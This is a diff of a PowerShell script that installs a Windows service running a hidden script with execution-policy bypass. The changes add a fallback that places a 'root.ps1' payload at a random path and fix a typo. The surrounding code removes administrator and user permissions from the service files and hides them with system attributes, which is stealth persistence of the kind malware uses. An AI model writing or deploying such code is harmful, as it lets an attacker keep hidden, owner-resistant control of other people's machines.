@@ -15,6 +15,11 @@ $idx = Get-Random -Minimum 0 -Maximum $paths.Length
 $scriptPath = $paths[$idx]
 $scriptPath = "$scriptPath\root_mon.ps1"
 
+if(($rootPath -eq $null) -or ($rootPath -eq "")){
+    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+    $rootPath = "$rootPath\root.ps1"
+}
+
 $serviceName = "MyRootMonService"
 $exePath = "powershell.exe"
 $arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath $rootPath"
@@ -78,7 +83,7 @@ icacls $scriptPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone"
 
 # 4. Explicitly remove your user account
 icacls $nssmexe /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
-icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Nulls
+icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
 
 
 attrib +h +s +r $nssmFolder
